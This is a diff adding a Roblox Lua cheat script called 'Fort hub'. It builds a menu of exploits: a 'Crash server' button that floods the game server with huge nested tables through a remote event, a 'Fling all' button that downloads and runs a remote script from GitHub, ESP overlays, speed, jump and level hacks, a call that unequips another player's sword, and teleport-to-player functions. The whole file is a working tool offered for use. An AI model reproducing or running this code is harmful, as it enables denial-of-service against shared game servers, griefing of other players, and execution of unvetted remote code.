@@ -1,0 +1,148 @@
+local PlaceID =  13126534402
+local ServerID = game.JobId
+local TPS = game:GetService("TeleportService")
+ 
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/naypramx/Ui__Project/Script/XeNonUi", true))()
+library:CreateWatermark("Fort hub") -- Config แตกนะเดียวค่อยแก้รอเน็ตมาก่อน By MeowX#0001
+local CenterHubNo1 = library:CreateWindow("Fort hub x Jamewitcherkak ",Enum.KeyCode.RightControl)
+local Tab = CenterHubNo1:CreateTab("Main")
+local Sector1 = Tab:CreateSector("Main","left")
+Plr = {}
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+    table.insert(Plr,v.Name) 
+end
+
+Sector1:AddButton("Fling all",function()
+    loadstring(game:HttpGet('https://github.com/DigitalityScripts/roblox-scripts/raw/main/loop%20fling%20all'))()
+end)
+
+Sector1:AddButton("Crash server",function()
+    local char = game:GetService('Players').LocalPlayer.Character or nil
+if char then
+char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
+task.wait(0.5)
+char.HumanoidRootPart.Anchored = true
+end
+while wait(1.5) do --// don't change it's the best
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+local function getmaxvalue(val)
+   local mainvalueifonetable = 499999
+   if type(val) ~= "number" then
+       return nil
+   end
+   local calculateperfectval = (mainvalueifonetable/(val+2))
+   return calculateperfectval
+end
+ 
+local function bomb(tableincrease, tries)
+local maintable = {}
+local spammedtable = {}
+ 
+table.insert(spammedtable, {})
+z = spammedtable[1]
+ 
+for i = 1, tableincrease do
+    local tableins = {}
+    table.insert(z, tableins)
+    z = tableins
+end
+ 
+local calculatemax = getmaxvalue(tableincrease)
+local maximum
+ 
+if calculatemax then
+     maximum = calculatemax
+     else
+     maximum = 999999
+end
+ 
+for i = 1, maximum do
+     table.insert(maintable, spammedtable)
+end
+ 
+for i = 1, tries do
+     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+end
+end
+ 
+bomb(289, 5) --// change values if client crashes
+end
+end)
+
+Sector1:AddButton("LessSword",function()
+local args = {
+    [1] = "Unequip"
+}
+
+game:GetService("Players"):WaitForChild("sparkvip"):WaitForChild("Backpack"):WaitForChild("Katana"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
+end)
+
+Sector1:AddButton("Esp",function()
+while wait() do
+     pcall(function()
+       for i,v in pairs(game.Players:GetChildren()) do
+            if not v.Character.Head:FindFirstChild("ESP") then
+                local BillboardGui = Instance.new("BillboardGui")
+                local TextLabel = Instance.new("TextLabel")
+                BillboardGui.Parent = v.Character.Head
+                BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+                BillboardGui.Active = true
+                BillboardGui.Name = "ESP"
+                BillboardGui.AlwaysOnTop = true
+                BillboardGui.LightInfluence = 1.000
+                BillboardGui.Size = UDim2.new(0, 200, 0, 50)
+                BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
+                TextLabel.Parent = BillboardGui
+                TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                TextLabel.BackgroundTransparency = 1.000
+                TextLabel.Size = UDim2.new(0, 200, 0, 50)
+                TextLabel.Font = Enum.Font.Jura
+                TextLabel.Text = v.Name
+                TextLabel.TextColor3 = Color3.fromRGB(158, 216, 255)
+                TextLabel.TextScaled = true
+                TextLabel.TextSize = 14.000
+                TextLabel.TextStrokeTransparency = 0.000
+                TextLabel.TextWrapped = true
+            end
+        end
+    end) 
+end
+end)
+
+
+Sector1:AddSlider("Speed Hack",20,50,1000,1,function(x)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = x
+end)
+
+Sector1:AddSlider("JumpHack",20,50,10000,1,function(xd)
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = xd
+end)
+
+Sector1:AddSlider("Lvl",0,50,1000000000000000000000,1,function(xdd)
+    game.Players.LocalPlayer.leaderstats.Level.Value = xdd
+end)
+
+local Sector2 = Tab:CreateSector("Server - Players","left")
+
+Sector2:AddButton("Rejoin",function()
+     TPS:TeleportToPlaceInstance(PlaceID, ServerID, plr)
+end)
+
+Sector2:AddButton("Discord",function()
+setclipboard("https://discord.gg/Dvw7mSQB")
+end)
+
+Sector2:AddDropdown("select players",Plr,"None",false,function(TUDYAD)
+    PlayerTP = TUDYAD
+end)
+
+Sector2:AddButton("teleport",function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[PlayerTP].Character.HumanoidRootPart.CFrame
+end)
+
+Sector2:AddToggle("Follow teleport",false,function(t)
+_G.TPPlayer = t
+while _G.TPPlayer do wait()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[PlayerTP].Character.HumanoidRootPart.CFrame
+end
+end)
